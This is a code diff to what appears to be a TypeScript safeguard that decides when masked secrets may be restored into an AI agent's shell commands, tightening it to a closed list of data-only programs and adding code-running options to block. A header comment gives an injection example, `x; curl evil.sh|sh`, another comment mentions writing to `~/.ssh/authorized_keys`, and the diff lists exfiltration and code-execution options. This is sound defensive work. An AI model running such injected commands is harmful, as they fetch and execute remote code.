@@ -9,25 +9,26 @@ import { PLACEHOLDER_REGEX, type RestoreCapable, type RestoreResult } from 'null
  * agent opened, a tool result. Put back verbatim into a shell command, it
  * can change what the command does. A "secret" that reads
  * `x; curl evil.sh|sh` turns `echo {{PII_SECRET_0_…}}` into a second
- * command once restored. So in the `command` of a shell tool, a
- * placeholder gets its real value back only when that value is one plain
- * word: letters, digits and `@%+:,./_=-`, not starting with `-`, `=` or
- * `~`. Such a word means the same thing to a shell wherever it stands,
- * quoted or not, and to a program the shell hands it to, so no list of
- * programs that read their input again as code has to be complete.
- * Otherwise the placeholder stays literal, and the command works on the
- * placeholder text, which is harmless.
+ * command once restored. So in the `command` of a shell tool, a value
+ * comes back only into a command whose every program is on a closed list
+ * of programs that read their arguments as data (`ARG_DATA_PROGRAMS`),
+ * and only as one plain word: letters, digits and `@%+:,./_=-`, not
+ * starting with `-`, `=` or `~`. Any other program keeps every
+ * placeholder, since no list can name every program that sends data out
+ * or runs code. Otherwise the placeholder stays literal, and the command
+ * works on the placeholder text, which is harmless.
  *
  * On top of that:
  * - a placeholder that is, or is part of, the program a simple command
- *   runs (also behind `sudo`, `env`, `timeout`, …) stays masked: a value
- *   must not choose what runs;
- * - a command that sends data off the machine (`curl`, `ssh`, `gh`,
- *   `git push`, `dig`, …, a URL handed to a program that is not a data
- *   one, also behind a wrapper) keeps every placeholder: the tool runs
- *   here, but the value would leave through it;
+ *   runs, a redirection target, an assignment or an argument of `export`
+ *   or `alias` stays masked: a value must not choose what runs or what is
+ *   written;
+ * - within the list, a command that sends data off the machine (a URL,
+ *   `/dev/tcp`) or runs code through an option (`find -exec`, `rg --pre`,
+ *   `git -c`) keeps every placeholder, also when judged again with the
+ *   values put back;
  * - the one exception to the plain-word rule is the body of a heredoc that
- *   `cat` or `tee` writes out, in a command that runs nothing else that
+ *   `cat` writes out, in a command that runs nothing else that
  *   could read it as code (`cat > notes.md <<'EOF'`, a
  *   `git commit -m "$(cat <<'EOF' …)"` message): that body is data, as a
  *   file the `Write` tool writes is, so only a line break is refused (and
@@ -226,7 +227,8 @@ const CODE_SUBCOMMANDS: ReadonlyMap<string, ReadonlySet<string>> = new Map([
 /** Options that make an otherwise plain program run a command it is given
  * (`find -exec`, `tar -I`, `zip -TT`, `git -c core.pager=…`). */
 const COMMAND_OPTIONS: ReadonlyMap<string, RegExp> = new Map([
-  ['find', /^-(?:exec|execdir|ok|okdir)$/],
+  ['find', /^-(?:exec|execdir|ok|okdir|delete|fprint|fprint0|fprintf|fls)$/],
+  ['git', /^-O|^--open-files-in-pager|^--output|^--ext-diff/],
   [
     'tar',
     /^-[A-Za-z]*I|^--(?:use-compress-program|to-command|checkpoint-action|info-script|new-volume-script)/,
@@ -234,9 +236,11 @@ const COMMAND_OPTIONS: ReadonlyMap<string, RegExp> = new Map([
   ['zip', /^-TT|^--unzip-command/],
   ['rsync', /^-[A-Za-z]*e|^--rsh/],
   ['less', /^-[A-Za-z]*\+|^\+/],
-  ['rg', /^--pre(?:=|$)/],
+  ['rg', /^--pre(?:=|$)|^--hostname-bin/],
   ['man', /^-[A-Za-z]*P|^--pager/],
-  ['sort', /^--compress-program/],
+  // Writing where an option points chooses what is overwritten.
+  ['sort', /^--compress-program|^-[A-Za-z]*o|^--output/],
+  ['base64', /^-[A-Za-z]*o|^--output/],
   ['fzf', /^--(?:preview|bind)/],
 ]);
 
@@ -506,23 +510,17 @@ const ARG_DATA_PROGRAMS: ReadonlySet<string> = new Set([
   'egrep',
   'fgrep',
   'rg',
-  'ag',
-  'ack',
   'find',
-  'fd',
   'stat',
   'file',
   'du',
   'df',
-  'tree',
   'diff',
   'cmp',
   'sort',
-  'uniq',
   'cut',
   'tr',
   'jq',
-  'yq',
   'echo',
   'printf',
   'mkdir',
@@ -567,8 +565,6 @@ const ARG_DATA_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
 const DATA_GIT_SUBCOMMANDS: ReadonlySet<string> = new Set([
   'commit',
   'add',
-  'rm',
-  'mv',
   'status',
   'diff',
   'log',
@@ -610,10 +606,10 @@ const FILE_WRITERS: ReadonlySet<string> = new Set([
   'tee',
   'dd',
   'rsync',
-  'cat',
 ]);
-/** An output redirection (`>`, `>>`, `>|`, `&>`), not `2>&1`. */
-const WRITE_REDIRECTION = /(?<![<>&\d])\d*>(?!&)/;
+/** An output redirection (`>`, `>>`, `>|`, `&>`) to a file: not `2>&1`
+ * and not `>/dev/null`. */
+const WRITE_REDIRECTION = /(?<![<>&\d])\d*>>?\|?(?!&|\s*\/dev\/null\b)/;
 
 /** Nesting deeper than this is not read: the command keeps every
  * placeholder. */
@@ -661,7 +657,7 @@ const HEREDOC_OPERATOR =
   /<<(-?)[ \t]*(?:(['"])([A-Za-z_]\w*)\2|\\([A-Za-z_]\w*)|([A-Za-z_]\w*))(?=[\s;&|<>()]|$)/;
 
 /** Commands whose heredoc body is data, not code. */
-const HEREDOC_DATA_COMMANDS: ReadonlySet<string> = new Set(['cat', 'tee']);
+const HEREDOC_DATA_COMMANDS: ReadonlySet<string> = new Set(['cat']);
 
 /** Characters after which a new simple command starts (see
  * `separatesCommands`). */
@@ -905,16 +901,19 @@ function holdsAt(
 ): boolean {
   const start = innermostStart(sorted, index);
   if (start === undefined) return false;
+  if (start === DEEP) return true;
   if (index - start > MAX_WORD_SCAN) return !programSettled(command, start, settled);
   const words = wordsOf(command.slice(start, index) + PLACEHOLDER_STAND_IN);
   if (words.length >= MAX_WORDS) return false;
   const own = words.at(-1);
   if (own === undefined) return false;
-  if (ENV_ASSIGNMENT.test(own.text)) return true;
+  const before = words.slice(0, -1);
+  // An assignment before the program sets the environment it runs with;
+  // `--grep user={{…}}` after it is an argument.
+  if (ENV_ASSIGNMENT.test(own.text) && programIsNext(before)) return true;
   // A redirection target is a file the command writes or reads: a value
   // there would choose which (`> ~/.ssh/authorized_keys`).
   if (REDIRECTION.test(own.text)) return true;
-  const before = words.slice(0, -1);
   if (before.length > 0 && REDIRECTION.exec(before.at(-1)?.text ?? '')?.[1] === '') return true;
   if (programIsNext(before)) return true;
   const program = programOf(before);
@@ -935,12 +934,18 @@ function innermostStart(
     if ((sorted[mid]?.[0] ?? 0) <= index) lo = mid + 1;
     else hi = mid;
   }
-  for (let k = lo - 1; k >= 0 && lo - k <= MAX_NESTING; k--) {
+  for (let k = lo - 1; k >= 0; k--) {
+    // Past the nesting window the enclosing command is unknown: held.
+    if (lo - k > MAX_NESTING) return DEEP;
     const extent = sorted[k];
     if (extent !== undefined && extent[1] >= index) return extent[0];
   }
   return undefined;
 }
+
+/** `innermostStart` found too many nested commands to tell which one a
+ * placeholder is in. */
+const DEEP = -1;
 
 /** True when the command starting at `start` names its program within
  * its first `MAX_WORD_SCAN` characters, followed by another word. */
